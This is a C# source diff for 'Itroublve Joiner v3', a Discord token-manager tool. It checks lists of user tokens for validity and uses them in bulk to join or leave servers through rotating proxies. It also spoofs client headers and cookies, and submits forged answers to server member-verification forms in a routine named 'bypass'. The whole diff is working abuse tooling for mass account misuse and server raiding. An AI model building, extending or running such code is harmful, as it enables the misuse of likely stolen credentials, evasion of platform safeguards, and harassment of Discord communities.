@@ -2,15 +2,14 @@
 using System.Drawing;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
-using OpenQA.Selenium.Chrome;
 using System.Windows.Forms;
-using OpenQA.Selenium;
 using System.Collections.Generic;
 using System.Net;
 using System.Linq;
+using System.Security.Authentication;
+using Leaf.xNet;
 using Newtonsoft.Json;
 using System.Net.Http;
-using System.Diagnostics;
 
 namespace Itroublve_Joiner_v3
 {
@@ -21,7 +20,6 @@ namespace Itroublve_Joiner_v3
         public List<string> Tokens = new List<string>();
         public List<string> WorkingTokens = new List<string>();
         public bool flag = true;
-        ChromeDriver driver;
         #endregion
         #region GUI
         public TokenManager()
@@ -33,13 +31,29 @@ namespace Itroublve_Joiner_v3
             TokensRichTxt.AllowDrop = true;
             ProxiesRichTxt.DragDrop += new DragEventHandler(ProxiesRichTxt_DragDrop);
             ProxiesRichTxt.AllowDrop = true;
-            this.FormClosing += this.CloseBtn_Click;
+            FormClosing += CloseBtn_Click;
             RainbowTimer.Start();
         }
         private void TknSettingsBtn_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("Releasing in newer versions.", "Itroublve Token Manager");
+			var _TokenSettings = Application.OpenForms.OfType<TokenSettingsFrm>().FirstOrDefault();
+            if (_TokenSettings == null)
+            {
+                _TokenSettings = new TokenSettingsFrm(TokensRichTxt.Text != null ? TokensRichTxt.Text : null);
+            }
+            _TokenSettings.ShowDialog();
         }
+
+        private void frndBtn_Click(object sender, EventArgs e)
+        {
+            var _frndReq = Application.OpenForms.OfType<FriendOpt>().FirstOrDefault();
+            if (_frndReq == null)
+            {
+                _frndReq = new FriendOpt(TokensRichTxt.Text != null ? TokensRichTxt.Text : null);
+            }
+            _frndReq.ShowDialog();
+        }
+
         private void DelayBar_Scroll(object sender, EventArgs e)
         {
             DelayLbl.Text = DelayBar.Value.ToString() + "s";
@@ -113,13 +127,16 @@ namespace Itroublve_Joiner_v3
 
         private void CountToken_Tick(object sender, EventArgs e)
         {
-            CurrentStatusLbl.Text = $"Checking: {WorkingTokens.Count}/{Tokens.Count}";
+            int totalTokens = Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Count;
+            CurrentStatusLbl.Text = $"Working Tokens: {WorkingTokens.Count}/{totalTokens} || Current Token Count: {Tokens.Count}";
             CurrentStatusLbl.ForeColor = Color.Yellow;
-            if (Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Count == Tokens.Count)
+            if (totalTokens == Tokens.Count)
             {
                 TokensRichTxt.ReadOnly = false;
-                CurrentStatusLbl.Text = $"Valid Tokens: {WorkingTokens.Count}/{Tokens.Count}";
+                ChkTknPrxBtn.Enabled = true;
+                CurrentStatusLbl.Text = $"Valid Tokens: {WorkingTokens.Count}/{totalTokens}";
                 CurrentStatusLbl.ForeColor = Color.Green;
+                TokensRichTxt.Text = string.Join("\n", WorkingTokens);
                 CountToken.Stop();
             }
         }
@@ -145,16 +162,6 @@ namespace Itroublve_Joiner_v3
         #region Close & Exit
         private void CloseBtn_Click(object sender, EventArgs e)
         {
-            try
-            {
-                Process[] procs = Process.GetProcessesByName("chromedriver.exe");
-                foreach (Process p in procs) p.Kill();
-            }
-            catch
-            {
-                driver?.Quit();
-            }
-
             Environment.Exit(0);
         }
         #endregion
@@ -168,85 +175,86 @@ namespace Itroublve_Joiner_v3
         {
             if (InviteTxtbox.Text == string.Empty) InviteTxtbox.Text = "Enter Invite";
         }
+
         #endregion
         #endregion
-        #region Joiner 
-        public async Task Joiner()
+        #region Leaver 
+        private async void LeaveBtn_Click(object sender, EventArgs e)
         {
-            var options = new ChromeOptions();
-            options.AddArgument("--no-sandbox");
-            options.AddArgument("--headless");
-            options.AddArgument("--disable-gpu");
-            options.AddArgument("--log-level=3");
-            options.AddArgument("--disable-crash-reporter");
-            options.AddArgument("--disable-extensions");
-            options.AddArgument("--disable-in-process-stack-traces");
-            options.AddArgument("--disable-logging");
-            options.AddArgument("--disable-dev-shm-usage");
-            options.AddArgument("--ignore-certificate-errors");
+            while (CurrentStatusLbl.Text.Contains("Working Tokens: ")|| CurrentStatusLbl.Text.Contains("Joining")) ;
+            if (InviteTxtbox.Text == "Enter Invite") CurrentStatusLbl.Text = "No Valid Invite";
+            foreach (Match tkn in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
+            await Task.Run(() => LeaveAsync(tkn.Value)).ConfigureAwait(false);
+        }
+        public async void LeaveAsync(string Token)
+        {
+            var r = new HttpRequest();
+            r.Get($"https://discord.com/api/v9/invites/{InviteTxtbox.Text}");
+            dynamic info = JsonConvert.DeserializeObject(r.Response.ToString());
+            string guildId = info.guild.id.ToString();
             try
             {
-                var proxies = ProxiesRichTxt.Text.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
-                string proxy = proxies[new Random().Next(0, Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}").Count)];
-                var prx = new Proxy();
-                prx.Kind = ProxyKind.Manual;
-                prx.IsAutoDetect = false;
-                prx.HttpProxy = proxy;
-                options.Proxy = prx;
+                r.KeepTemporaryHeadersOnRedirect = false;
+                r.ClearAllHeaders();
+                r.EnableMiddleHeaders = false;
+                r.AllowEmptyHeaderValues = false;
+                r.AddHeader("Accept", "*/*");
+                r.AddHeader("Accept-Encoding", "gzip, deflate, br");
+                r.AddHeader("Accept-Language", "en-US");
+                r.AddHeader("Authorization", Token);
+                r.AddHeader("Connection", "keep-alive");
+                r.AddHeader("Cookie", $"__cfduid={TokenSettings.RandomCookie(43)}; __dcfduid={TokenSettings.RandomCookie(32)}; locale=en-US");
+                r.AddHeader("DNT", "1");
+                r.AddHeader("origin", "https://discord.com");
+                r.AddHeader("Referer", "https://discord.com/channels/@me");
+                r.AddHeader("TE", "Trailers");
+                r.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36");
+                r.AddHeader("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9");
+                r.SslProtocols = SslProtocols.Tls12;
+                if (!string.IsNullOrEmpty(ProxiesRichTxt.Text))
+                {
+                    var proxies = ProxiesRichTxt.Text.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
+                    string proxy = proxies[new Random().Next(0, Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}").Count)];
+                    r.Proxy = HttpProxyClient.Parse(proxy);
+                }
+                r.Delete($"https://discordapp.com/api/v9/users/@me/guilds/{guildId}");
             }
-            catch
-            { }
-            var service = ChromeDriverService.CreateDefaultService();
-            service.HideCommandPromptWindow = true;
-            service.EnableVerboseLogging = true;
+            catch{}
+        }
+        #endregion
+        #region Joiner 
+        private async void JoinBtn_Click(object sender, EventArgs e)
+        {
+            while (CurrentStatusLbl.Text.Contains("Working Tokens: ")) ;
+            if (InviteTxtbox.Text == "Enter Invite") CurrentStatusLbl.Text = "No Valid Invite";
+            await Task.Run(() => JoinBtnClicked()).ConfigureAwait(false);
+        }
+
+        public async Task JoinBtnClicked()
+        {
+            JoinBtn.Enabled = false;
+            TokensRichTxt.ReadOnly = true;
             if (Regex.Match(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Success)
             {
                 string invite = InviteTxtbox.Text;
                 invite = invite.Replace("discord.gg/", "");
-                invite = invite.Replace("discord.com/invite/", "");
+                invite = invite.Replace("discord.com/", "");
                 invite = invite.Replace("https://", "");
-                var request = new HttpClient();
-                var response = await request.GetAsync($"https://discord.com/api/v9/invites/{invite}").ConfigureAwait(false);
-                dynamic info = JsonConvert.DeserializeObject(response.Content.ReadAsStringAsync().Result);
-                string guildId = info.guild.id.ToString();
-                driver = new ChromeDriver(service, options);
-                driver.Navigate().GoToUrl("https://discord.com/api/invites/ichpro");
+                invite = invite.Replace("http://", "");
+                invite = invite.Replace("api", "");
+                invite = invite.Replace("v9/invites/", "");
+                invite = invite.Replace("v8/invites/", "");
+                invite = invite.Replace("v7/invites/", "");
+                invite = invite.Replace("/invites/", "");
+                invite = invite.Replace("v6/invites/", "");
+                invite = invite.Replace("/", "");
                 if (!string.IsNullOrEmpty(ProxiesRichTxt.Text))
                 {
                     CurrentStatusLbl.Text = "Joining [Proxied]";
                     CurrentStatusLbl.ForeColor = Color.Yellow;
                     foreach (Match m in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                     {
-                        if (!string.Join("\n", sad).Contains(m.Value))
-                        {
-                            sad.Add(m.Value);
-                            try
-                            {
-                                await Task.Delay(DelayBar.Value * 1000);
-                                driver.ExecuteScript("fetch(\"https://discord.com/api/v9/invites/" + invite + "\", { \"headers\": { \"authorization\": \"" + m.Value + "\", \"x-super-properties\": \"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTAuMC40NDMwLjkzIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3JlcGwuaXQvIiwicmVmZXJyaW5nX2RvbWFpbiI6InJlcGwuaXQiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMzNjQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9\"},  \"method\": \"POST\"});");
-                                request.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", m.Value);
-                                try 
-                                {
-                                    await Task.Delay(500).ConfigureAwait(false);
-                                    var sadness = await request.GetAsync($"https://discord.com/api/v9/guilds/{guildId}/member-verification?with_guild=false&invite_code={invite}");
-                                    dynamic form = JsonConvert.DeserializeObject(sadness.Content.ReadAsStringAsync().Result);
-                                    string msg = form.form_fields.ToString();
-                                    msg = msg.Replace("\n", "").Replace("\r", "");
-                                    msg = msg.Replace("}]", "");
-                                    msg = Regex.Replace(msg, @".*(?="").*(?="")",
-                                    match => { return match.Value.Replace("\"", "\\\""); });
-                                    msg = msg.Replace("\"", "\\\""); msg = msg.Replace("\\\\\"", "\\\"");
-                                    string date = sadness.Content.ReadAsStringAsync().Result.Substring(13, 32);
-                                    string oof = ("fetch(\"https://discord.com/api/v9/guilds/" + guildId + "/requests/@me\", { \"headers\": {\"authorization\": \"" + m.Value + "\",\"content-type\": \"application/json\",\"x-super-properties\": \"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTAuMC40NDMwLjkzIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3JlcGwuaXQvIiwicmVmZXJyaW5nX2RvbWFpbiI6InJlcGwuaXQiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMzNjQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9\"},  \"body\": \"{\\\"version\\\":\\\"" + date + "\\\",\\\"form_fields\\\":" + msg + ",\\\"response\\\":true}]}\",\"method\": \"PUT\"});");
-                                    driver.ExecuteScript(oof);
-                                }
-                                catch { }
-                            }
-                            catch (Exception x)
-                            {
-                                MessageBox.Show(x.Message);
-                            }
-                        }
+                        await Task.Run(() => JoinServer(m.Value, invite, true));
                     }
                 }
                 else
@@ -255,39 +263,9 @@ namespace Itroublve_Joiner_v3
                     CurrentStatusLbl.ForeColor = Color.Yellow;
                     foreach (Match m in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                     {
-                        if (!string.Join("\n", sad).Contains(m.Value))
-                        {
-                            sad.Add(m.Value);
-                            try
-                            {
-                                await Task.Delay(DelayBar.Value * 1000);
-                                driver.ExecuteScript("fetch(\"https://discord.com/api/v9/invites/" + invite + "\", { \"headers\": { \"authorization\": \"" + m.Value + "\", \"x-super-properties\": \"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTAuMC40NDMwLjkzIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3JlcGwuaXQvIiwicmVmZXJyaW5nX2RvbWFpbiI6InJlcGwuaXQiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMzNjQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9\"},  \"method\": \"POST\"});");
-                                request.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", m.Value);
-                                try
-                                {
-                                    await Task.Delay(500).ConfigureAwait(false);
-                                    var sadness = await request.GetAsync($"https://discord.com/api/v9/guilds/{guildId}/member-verification?with_guild=false&invite_code={invite}");
-                                    dynamic form = JsonConvert.DeserializeObject(sadness.Content.ReadAsStringAsync().Result);
-                                    string msg = form.form_fields.ToString();
-                                    msg = msg.Replace("\n", "").Replace("\r", "");
-                                    msg = msg.Replace("}]", "");
-                                    msg = Regex.Replace(msg, @".*(?="").*(?="")",
-                                    match => { return match.Value.Replace("\"", "\\\""); });
-                                    msg = msg.Replace("\"", "\\\""); msg = msg.Replace("\\\\\"", "\\\"");
-                                    string date = sadness.Content.ReadAsStringAsync().Result.Substring(13, 32);
-                                    string oof = ("fetch(\"https://discord.com/api/v9/guilds/" + guildId + "/requests/@me\", { \"headers\": {\"authorization\": \"" + m.Value + "\",\"content-type\": \"application/json\",\"x-super-properties\": \"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTAuMC40NDMwLjkzIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3JlcGwuaXQvIiwicmVmZXJyaW5nX2RvbWFpbiI6InJlcGwuaXQiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMzNjQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9\"},  \"body\": \"{\\\"version\\\":\\\"" + date + "\\\",\\\"form_fields\\\":" + msg + ",\\\"response\\\":true}]}\",\"method\": \"PUT\"});");
-                                    driver.ExecuteScript(oof);
-                                }
-                                catch { }
-                            }
-                            catch (Exception x)
-                            {
-                                MessageBox.Show(x.Message);
-                            }
-                        }
+                        await Task.Run(() => JoinServer(m.Value, invite, false));
                     }
-                    driver.Quit();
-                }   
+                }
             }
             if (CurrentStatusLbl.Text == "Joining" || CurrentStatusLbl.Text == "Joining [Proxied]")
             {
@@ -303,59 +281,107 @@ namespace Itroublve_Joiner_v3
             TokensRichTxt.ReadOnly = false;
         }
 
-        private async void JoinBtn_Click(object sender, EventArgs e)
+        public async void JoinServer(string Token, string invite, bool proxied)
         {
-            JoinBtn.Enabled = false;
-            TokensRichTxt.ReadOnly = true;
-            sad.Clear();
-            BeginInvoke(new MethodInvoker(async delegate ()
+            await Task.Delay(DelayBar.Value * 1000).ConfigureAwait(false);
+            try
             {
-                await Task.Run(Joiner).ConfigureAwait(false);
-            }));
+                HttpRequest r = new HttpRequest();
+                r.KeepTemporaryHeadersOnRedirect = false;
+                r.ClearAllHeaders();
+                r.EnableMiddleHeaders = false;
+                r.AllowEmptyHeaderValues = false;
+                r.AddHeader("Accept", "*/*");
+                r.AddHeader("Accept-Encoding", "gzip, deflate, br");
+                r.AddHeader("Accept-Language", "en-US");
+                r.AddHeader("Authorization", Token);
+                r.AddHeader("Connection", "keep-alive");
+                r.AddHeader("Cookie", $"__cfduid={TokenSettings.RandomCookie(43)}; __dcfduid={TokenSettings.RandomCookie(32)}; locale=en-US");
+                r.AddHeader("DNT", "1");
+                r.AddHeader("origin", "https://discord.com");
+                r.AddHeader("Referer", "https://discord.com/channels/@me");
+                r.AddHeader("TE", "Trailers");
+                r.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36");
+                r.AddHeader("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9");
+                r.SslProtocols = SslProtocols.Tls12;
+                if (proxied)
+                {
+                    var proxies = ProxiesRichTxt.Text.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
+                    string proxy = proxies[new Random().Next(0, Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}").Count)];
+                    r.Proxy = HttpProxyClient.Parse(proxy);
+                }
+                r.Post("https://discord.com/api/v9/invites/" + invite);
+                if (ServerVerificationChkbox.Checked)
+                {
+                    var request = new HttpClient();
+                    request.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", Token);
+                    try
+                    {
+                        r.Get($"https://discord.com/api/v9/invites/{invite}");
+                        dynamic info = JsonConvert.DeserializeObject(r.Response.ToString());
+                        string guildId = info.guild.id.ToString();
+                        await Task.Delay(500);
+                        var response = await request.GetAsync($"https://discord.com/api/v9/guilds/{guildId}/member-verification?with_guild=false");
+                        dynamic form = JsonConvert.DeserializeObject(response.Content.ReadAsStringAsync().Result);
+                        string msg = form.form_fields.ToString();
+                        msg = msg.Replace("\n", "").Replace("\r", "");
+                        msg = msg.Replace("}]", "");
+                        string date = response.Content.ReadAsStringAsync().Result.Substring(13, 32);
+                        var bypass = new HttpRequest();
+                        bypass.AddHeader("Authorization", Token);
+                        bypass.Put($"https://discord.com/api/v9/guilds/{guildId}/requests/@me", $"{{\"version\":\"{date}\",\"form_fields\":{msg},\"response\":true}}]}}", "application/json");
+                    }
+                    catch { }
+                }
+            }
+            catch
+            {
+            }
         }
         #endregion
         #region Token Checker
-        private void ChkTknPrx_Click(object sender, EventArgs e)
+        private async void ChkTknPrx_Click(object sender, EventArgs e)
         {
             ChkTknPrxBtn.Enabled = false;
             TokensRichTxt.ReadOnly = true;
             CountToken.Start();
-            BeginInvoke(new MethodInvoker(async delegate ()
+            WorkingTokens.Clear();
+            Tokens.Clear();
+            foreach (Match token in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
             {
-                Parallel.ForEach(Regex.Matches(TokensRichTxt.Text,  @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Cast<Match>(),
-                async token =>
-                {
-                    await Task.Run(() => Checker(token.Value)).ConfigureAwait(false);
-                });
-            }));
+                await Task.Run(() => Checker(token.Value)).ConfigureAwait(false);
+            }
         }
         public async Task Checker(string Token)
         {
-            try
+            Parallel.ForEach(Regex.Matches(Token, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Cast<Match>(), async (token, state) => 
             {
                 var wc = new WebClient();
                 wc.Headers.Add("Content-Type", "application/json");
                 wc.Headers.Add(HttpRequestHeader.Authorization, Token);
-                wc.DownloadString("https://discordapp.com/api/v9/users/@me/guilds");
-                WorkingTokens.Add(Token);
-                wc.Dispose();
-            }
-            catch
-            {
                 try
                 {
-                    var wc = new WebClient();
-                    wc.Headers.Add("Content-Type", "application/json");
-                    wc.Headers.Add(HttpRequestHeader.Authorization, Token);
-                    wc.DownloadString("https://discordapp.com/api/v8/users/@me/guilds");
-                    wc.Dispose();
+                    wc.DownloadString("https://discordapp.com/api/v9/users/@me/guilds");
                     WorkingTokens.Add(Token);
                 }
-                catch
+                catch (Exception x)
                 {
+                    if (!x.Message.Contains("401") & !x.Message.Contains("403"))
+                    {
+                        try
+                        {
+                            wc.DownloadString("https://discordapp.com/api/v8/users/@me/guilds");
+                            WorkingTokens.Add(Token);
+                        }
+                        catch
+                        {
+                        }
+                    }
                 }
-            }
-            Tokens.Add(Token);
+                Tokens.Add(Token);
+                wc?.Dispose();
+                state.Break();
+            });
         }
         #endregion
     }
